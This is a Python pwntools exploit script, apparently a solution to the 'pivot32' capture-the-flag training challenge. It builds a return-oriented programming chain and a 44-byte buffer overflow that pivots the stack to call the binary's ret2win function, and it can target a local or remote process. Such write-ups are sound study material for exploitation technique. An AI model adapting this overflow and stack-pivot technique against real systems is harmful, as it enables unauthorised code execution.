#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pivot32'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
peax = 0x080488c0
pebx = 0x08048571
xchg_eax_esp = 0x080488c2
get_eax = 0x080488c4  #    mov eax, dword [eax] 
add_eax = 0x080488c7  #    add eax, ebx
call_eax = 0x080486a3 #    call eax

ru(' place to pivot: ')
pivot = eval(rc(10))
info_addr('pivot',pivot)

# rop
ropchain  = p32(elf.sym['foothold_function']) 
ropchain += p32(peax) + p32(elf.got['foothold_function']) 
ropchain += p32(pebx) + p32(0x00000967-0x00000770) # ret2win - foothold_function
ropchain += p32(get_eax) + p32(add_eax)
ropchain += p32(call_eax)
sla('> ', ropchain)

# bof
offset = 44
payload = 'A'*offset
payload += p32(peax) + p32(pivot) + p32(xchg_eax_esp)

ru('> ')
# debug()
sl(payload)

p.interactive()

